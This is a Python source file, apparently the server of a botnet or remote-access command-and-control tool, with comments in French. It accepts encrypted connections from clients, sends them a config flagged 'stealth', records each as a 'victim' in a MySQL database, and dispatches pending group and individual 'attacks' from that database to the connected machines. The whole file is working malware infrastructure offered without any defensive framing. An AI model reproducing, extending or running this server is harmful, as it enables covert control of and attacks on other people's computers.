import argparse
import os
import mysql.connector
import json
import socket
import select
import threading
import rsa
import base64

from env import *
from database import *
from network import *
from functions import *
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from queue import Queue, Empty




def start_server(port):
    clients = []

    # Socket
    host = "0.0.0.0"
    port = port

    socket_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    socket_server.setblocking(0)
    socket_server.bind((host, port))
    socket_server.listen()
    print("ecoute sur : " + str(host) + ":" + str(port))


    connection_list = [socket_server]

    # Database
    db = mysql.connector.connect(
        host=DBHOST,
        user=DBUSER,
        password=DBPASSWORD,
        database=DB
    )


    mycursor = db.cursor()

    running = True


    while running:
        print("running")
        # print(connection_list)

        read_sockets, write_sockets, error_sockets = select.select(connection_list, [], connection_list, 3.0)


        # print("read_sockets : " + str(read_sockets))

        for sock in read_sockets:
            # Nouvelle connexion
            if sock is socket_server:
                conn, addr = sock.accept()

                # Création des threads d'émission et de réception
                emission_queue = Queue()
                thread_emission = threading.Thread(target=emission, args=(emission_queue, conn, addr))
                thread_emission.start()

                reception_queue = Queue()
                thread_reception = threading.Thread(target=reception, args=(reception_queue, conn, addr))
                thread_reception.start()

                # Handshake
                print("handshake with " + str(addr))

                # Récupération de la clé publique du client
                public_key = rsa.PublicKey.load_pkcs1_openssl_pem(reception_queue.get())

                # Génération de la clé symétrique
                sym_key = get_random_bytes(16)
                iv = get_random_bytes(16)
                # print("symetric key : " + str(sym_key))
                # print("iv : " + str(iv))

                json_conf = '{"action":"' + base64.b64encode("client_config".encode()).decode() + '","b64symetric":"' + base64.b64encode(sym_key).decode() + '","b64iv":"' + base64.b64encode(iv).decode() + '","multithread":true,"stealth":true}'

                # Chiffrement de la data avec la clé publique du client
                encrypted_sym_key = rsa.encrypt(json_conf.encode(), public_key)

                # Envoi de la clé symétrique chiffrée
                emission_queue.put(encrypted_sym_key)

                # print("[+] Waiting for client handshake informations")

                received_data = reception_queue.get()

                cipher = AES.new(sym_key, AES.MODE_CBC, iv=iv)
                pt = unpad(cipher.decrypt(received_data), AES.block_size).decode('utf-8')
                print("received data : " + str(pt))

                # Récupération de l'uid client
                uid = json.loads(pt)["uid"]
                client_os = json.loads(pt)["os"]


                # Ajout de la victime en base de données
                add_victim_to_db(db, mycursor, uid, client_os, addr[0], sym_key, "testupdated")

                # # Vérification de l'uid dans la base de données
                # query = "SELECT * FROM victims WHERE uid = %s"
                # values = (uid,)

                # mycursor.execute(query, values)

                # myresult = mycursor.fetchall()

                # if len(myresult) > 0:
                #     # print("client already in the database")
                #     query = "UPDATE victims SET ip = %s, sym_key = %s, pub_key = %s WHERE uid = %s"
                #     values = (addr[0], base64.b64encode(sym_key).decode(), base64.b64encode("testupdated".encode()).decode(), uid)

                #     mycursor.execute(query, values)

                # else:
                #     # print("client not in the database")
                #     # Ajout du client à la base de données

                #     query = "INSERT INTO victims (uid, ip, sym_key, pub_key, stealth, multi_thread) VALUES (%s, %s, %s, %s, %s, %s)"
                #     values = (uid, addr[0], base64.b64encode(sym_key).decode(), base64.b64encode("test".encode()).decode(), True, True)

                #     mycursor.execute(query, values)

                # db.commit()

                # Ajout du client à la liste des clients
                clients.append(dict(addr = addr, 
                                    conn = conn, 
                                    thread_emission = thread_emission, 
                                    emission_queue = emission_queue, 
                                    thread_reception = thread_reception, 
                                    reception_queue = reception_queue, 
                                    sym_key = sym_key, 
                                    iv = iv,
                                    uid = uid,
                                    os = client_os
                                ))


        
        # Récupération des attaques de groupe à lancer
        attacks = get_group_attacks(mycursor)
        # state = "pending", "running", "finished", "error"
        # query = "SELECT * FROM group_attacks WHERE state = 'pending';"

        # mycursor.execute(query)

        # attacks = mycursor.fetchall()

        # print("ATT : " + str(attacks))


        for attack in attacks:

            # Récupération des données de l'attaque
            # attack_data = json.loads(attack[4])
            # attack_type = attack[2]
            # attack_id = attack[0]

            # print("attack_data : " + str(attack_type))


            # Récupération des ordinateurs du groupe
            query = "SELECT uid FROM victims WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = %s)"
            values = (attack[1], )

            mycursor.execute(query, values)
            victims_uid = mycursor.fetchall()


            attack_sent = False
            number_of_attackers = 0

            for victim_uid in victims_uid:
                for client in clients:
                    if client['uid'] == victim_uid[0]:
                        execute_attack(client, attack)
                        attack_sent = True
                        number_of_attackers += 1

            
            # Mise à jour de l'attaque si elle a été envoyée au moins une fois
            if attack_sent:
                query = "UPDATE group_attacks SET state = 'running', executed_rate = %s WHERE id = %s"
                exec_rate = str(number_of_attackers) +"/" + str(len(victims_uid))
                values = (exec_rate, attack[0], )

                mycursor.execute(query, values)

                db.commit()



#########################################################################
        

        # Récupération des attaques individuelles à lancer
        attacks = get_victim_attacks(mycursor)
        # # state = "pending", "running", "finished", "error"
        # query = "SELECT * FROM victim_attacks WHERE state = 'pending';"

        # mycursor.execute(query)

        # attacks = mycursor.fetchall()

        for attack in attacks:

            # Récupération des données de l'attaque
            data = json.loads(attack[4])
            
            # Récupération des ordinateurs du groupe
            query = "SELECT uid FROM victims WHERE id = %s"
            values = (attack[1], )

            mycursor.execute(query, values)

            victims = mycursor.fetchall()

            for victim in victims:
                victim_uid = victim[0]
                for client in clients:
                    execute_attack(client, data)

            # Mise à jour de l'attaque
            query = "UPDATE victim_attacks SET state = 'running' WHERE id = %s"
            values = (attack[0], )

            mycursor.execute(query, values)
            
        #######################
            
                
        for client in clients:

            # Récupération des données clients
            try:
                encrypted_data_received = client['reception_queue'].get_nowait()

                cipher = AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
                pt = unpad(cipher.decrypt(encrypted_data_received), AES.block_size).decode('utf-8')

                print(client['addr'])
                print("received data : " + str(pt))

            except Empty:
                pass